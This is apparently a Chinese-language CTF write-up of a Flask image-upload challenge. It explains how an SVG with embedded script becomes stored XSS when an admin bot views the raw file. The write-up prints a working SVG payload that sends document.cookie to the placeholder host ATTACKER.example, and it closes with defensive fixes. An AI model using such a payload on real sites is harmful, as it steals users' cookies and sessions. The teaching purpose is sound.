# This Is Just Another One Of Those Classic Web Challenges

## 题目简述

Flask 应用允许上传 JPG 或 SVG，并把原始内容按相应 MIME 类型从 `/image/<id>` 返回。每次上传后，后台 Puppeteer 会访问这一原始图片地址；管理员浏览器预先设置了非 HttpOnly 的 `admin_flag` Cookie。由于 SVG 可以内嵌 JavaScript，上传功能形成存储型 XSS。

## 解题过程

准备一个小于 50000 字节、扩展名为 `.svg` 的文件。官方 `sol.svg` 的核心 payload 是读取 `document.cookie` 并发往攻击者端点；长期 WP 中应使用自己的接收地址，不保留比赛期间的一次性 webhook：

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <script>
    fetch(
      "https://ATTACKER.example/collect?cookie=" +
      encodeURIComponent(document.cookie)
    );
  </script>
</svg>
```

上传后服务生成 6 位图片 ID，并把 ID 通知 admin bot。bot 访问的是：

```text
/image/<id>
```

该响应直接使用 `image/svg+xml` 返回未净化的用户内容，所以 SVG 脚本在挑战站点源下执行。`admin_flag` 的配置为 `httpOnly: false`，脚本可从 `document.cookie` 读取：

```text
admin_flag=grey{this_is_the_flag_for_real}
```

## 方法总结

- 核心技巧：上传含脚本的 SVG，在管理员 bot 访问原始文件时触发同源存储型 XSS并窃取可读 Cookie。
- 识别信号：允许 SVG、原样以内联 MIME 返回、自动管理员审查，以及敏感 Cookie 未设置 HttpOnly。
- 复用要点：图片上传不能只检查扩展名；SVG 属于主动内容，应做严格净化、强制下载或放到隔离域名，并把敏感 Cookie 设置为 HttpOnly。
